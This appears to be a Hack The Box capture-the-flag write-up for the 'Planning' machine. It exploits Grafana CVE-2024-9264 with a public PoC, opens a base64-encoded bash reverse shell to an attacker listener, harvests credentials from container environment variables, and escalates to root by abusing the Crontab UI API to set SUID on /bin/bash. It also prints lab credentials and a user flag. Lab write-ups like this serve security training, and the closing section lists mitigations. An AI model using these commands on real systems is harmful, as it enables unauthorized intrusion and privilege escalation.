# Planning — HTB Writeup

> **Platform:** Hack The Box
> **Author:** k41r0s3
> **Difficulty:** Easy
> **Category:** Web / Linux
> **Date:** March 3, 2026

---

## TL;DR

Discovered a Grafana instance on a hidden vhost and exploited **CVE-2024-9264** (Grafana 11.0.0 DuckDB RCE) to gain a shell inside a Docker container as root. Found SSH credentials in the container's environment variables, pivoted to the host as user `enzo`. Escalated to root by abusing a locally running **Crontab UI** instance authenticated with credentials found in `/opt/crontabs/crontab.db`, editing an existing cron job to set the SUID bit on `/bin/bash`.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `curl` | Web requests, vhost testing, API interaction |
| `ffuf` | Subdomain/vhost fuzzing |
| `whatweb` | Web technology fingerprinting |
| `CVE-2024-9264 PoC` | Grafana DuckDB RCE exploit |
| `netcat` | Reverse shell listener |
| `LinPEAS` | Automated privilege escalation enumeration |
| `ssh` | Remote access and port forwarding |

---

## Recon

### Port Scanning

```bash
nmap -sC -sV --top-ports 1000 -T4 10.129.43.11 -oN nmap/initial.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
```

Only **2 open ports** — SSH and HTTP. The HTTP service immediately redirects to `planning.htb`, indicating virtual host routing is in play.

### Observations

- nginx with vhost routing suggests hidden subdomains
- SSH is likely an endgame vector once credentials are found
- The entire attack surface is web-based initially

---

## Enumeration

### Web Application

Added the hostname to `/etc/hosts`:

```bash
echo "10.129.43.11  planning.htb" | sudo tee -a /etc/hosts
```

Browsing to `http://planning.htb/` revealed a static "Edukate" online education website template — no login panel, no obvious attack surface. WhatWeb confirmed nginx 1.24.0 with jQuery 3.4.1 and a PHP backend.

```bash
whatweb http://planning.htb/
# nginx/1.24.0, Bootstrap, jQuery[3.4.1], PHP
```

### Subdomain Enumeration

Since nginx was doing virtual host routing, we tested common service subdomains manually:

```bash
for sub in grafana gitea gitlab portainer owncloud nextcloud dev admin panel api app monitoring scheduler cron planner; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: ${sub}.planning.htb" http://10.129.43.11/)
  size=$(curl -s -o /dev/null -w "%{size_download}" -H "Host: ${sub}.planning.htb" http://10.129.43.11/)
  echo "$sub -> $code ($size bytes)"
done
```

```
grafana -> 302 (29 bytes)    # <-- Different response!
gitea   -> 301 (178 bytes)
gitlab  -> 301 (178 bytes)
...
```

**`grafana.planning.htb`** stood out with a `302` redirect and different response size compared to all other subdomains returning the default `301 (178 bytes)`.

```bash
echo "10.129.43.11  grafana.planning.htb" | sudo tee -a /etc/hosts
```

### Grafana Fingerprinting

```bash
curl -s http://grafana.planning.htb/api/health | python3 -m json.tool
```

```json
{
    "commit": "83b9528bce85cf9371320f6d6e450916156da3f6",
    "database": "ok",
    "version": "11.0.0"
}
```

**Grafana 11.0.0** — vulnerable to **CVE-2024-9264**.

---

## Exploitation

### CVE-2024-9264 — Grafana DuckDB RCE

**Vulnerability Overview:**
CVE-2024-9264 is a DuckDB SQL injection vulnerability in Grafana's experimental SQL Expressions feature. Any authenticated user can execute arbitrary DuckDB SQL queries, and on version 11.0.0 specifically, this can be leveraged for OS command execution via the `shellfs` community extension.

**Affected versions:** Grafana 11.0.0 — 11.2.1

We were provided initial credentials: `admin:0D5oT70Fq13EvB5r`

```bash
git clone https://github.com/nollium/CVE-2024-9264.git
cd CVE-2024-9264
pip install -r requirements.txt
```

**Testing RCE:**

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "id" http://grafana.planning.htb
```

```
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: id
uid=0(root) gid=0(root) groups=0(root)
```

We have RCE as root inside the Grafana Docker container.

**Getting a Reverse Shell:**

The payload required base64 encoding to avoid quote conflicts with the DuckDB query:

```bash
echo 'bash -i >& /dev/tcp/<YOUR_TUN0_IP>/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS80NDQ0IDA+JjEK
```

```bash
# Start listener
nc -lvnp 4444

# Execute
python3 CVE-2024-9264.py \
  -u admin \
  -p 0D5oT70Fq13EvB5r \
  -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zOS80NDQ0IDA+JjEK | base64 -d | bash" \
  http://grafana.planning.htb
```

Shell received as `root@7ce659d667d7` — confirmed Docker container via `/.dockerenv`.

### Credential Discovery in Container

```bash
env
```

```
GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=[REDACTED]
```

Grafana admin credentials stored as environment variables — a common misconfiguration in Docker deployments.

### SSH Access as enzo

```bash
ssh enzo@10.129.43.11
# Password: [REDACTED]
```

```bash
cat ~/user.txt
# 42ad09b80b6c7db5bfc9576aada6543a
```

🚩 **User flag captured!**

---

## Post-Exploitation

### Internal Service Discovery

```bash
ss -tlnp
```

```
LISTEN  127.0.0.1:33060   # MySQL X Protocol
LISTEN  127.0.0.1:3306    # MySQL
LISTEN  127.0.0.1:3000    # Grafana
LISTEN  127.0.0.1:8000    # Unknown - Express.js
LISTEN  0.0.0.0:80        # nginx
LISTEN  *:22              # SSH
```

Port **8000** was running an Express.js application with Basic Authentication (`WWW-Authenticate: Basic realm="Restricted Area"`).

### Crontab DB Analysis

```bash
cat /opt/crontabs/crontab.db
```

```json
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana ... zip -P [REDACTED] ..."}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *"}
```

Two findings:
1. **Password** `[REDACTED]` embedded in the backup command
2. A **Cleanup job** running `/root/scripts/cleanup.sh` every minute as root

LinPEAS confirmed the Crontab UI service credentials:

```
Service: crontab-ui.service (User: root)
Basic-Auth credentials: user='root' pwd='[REDACTED]'
```

---

## Privilege Escalation

### Crontab UI Abuse

Port 8000 was running **Crontab UI** — a web-based cron job manager running as **root**. The cleanup script ran every minute and would reset the crontab database, making timing critical.

**The Challenge:** The cleanup.sh script reset `/opt/crontabs/crontab.db` every minute, wiping any changes we made. We needed to edit a job and trigger it immediately within the same window.

**The Strategy:**
1. Wait for the real root-owned Crontab UI service to start
2. Edit the existing Cleanup job command via the API
3. Immediately trigger execution via the `runjob` endpoint
4. Execute `/bin/bash -p` before cleanup.sh restores everything

```bash
until ss -tlnp | grep -q 8000; do
  echo "waiting..."; sleep 1
done && echo "UP!" \
&& curl -s -u root:[REDACTED] -X POST "http://127.0.0.1:8000/save" \
  -d "_id=gNIRXh1WIc9K7BYX&name=Cleanup&command=chmod+u%2Bs+/bin/bash&schedule=*+*+*+*+*&logging=false" \
&& sleep 0.2 \
&& curl -s -u root:[REDACTED] -X POST "http://127.0.0.1:8000/runjob" \
  -d "_id=gNIRXh1WIc9K7BYX" \
&& sleep 0.5 \
&& /bin/bash -p -c 'cat /root/root.txt'
```

```
***REMOVED***
```

🚩 **Root flag captured!**

---

## Key Findings

| Username | Password | Service |
|---|---|---|
| `admin` | `0D5oT70Fq13EvB5r` | Grafana |
| `enzo` | `[REDACTED]` | SSH |
| `root` | `[REDACTED]` | Crontab UI |

---

## Lessons Learned

- **Always enumerate vhosts** on HTB boxes using nginx — the real attack surface is often hidden behind a virtual host
- **Container environment variables** are a goldmine for credentials — always run `env` after getting a container shell
- **Internal services** (`ss -tlnp`) often run as root and are frequently overlooked
- **Timing matters** — when a cleanup script resets your changes every minute, automate your exploit to fire the moment the service becomes available
- **Read the source** — inspecting `app.js` revealed the correct API endpoints and parameter names that the GUI uses

---

## Mitigation / Remediation

| Finding | Recommendation |
|---|---|
| Grafana 11.0.0 CVE-2024-9264 | Upgrade to Grafana 11.0.5+ or later |
| Credentials in container env vars | Use Docker secrets or a vault solution |
| Crontab UI exposed locally as root | Run as non-privileged user, restrict API access |
| Password in cron command | Never embed passwords in cron job commands |
| Cleanup script creates attack window | Harden cleanup logic, monitor for unauthorized changes |

---

*k41r0s3*
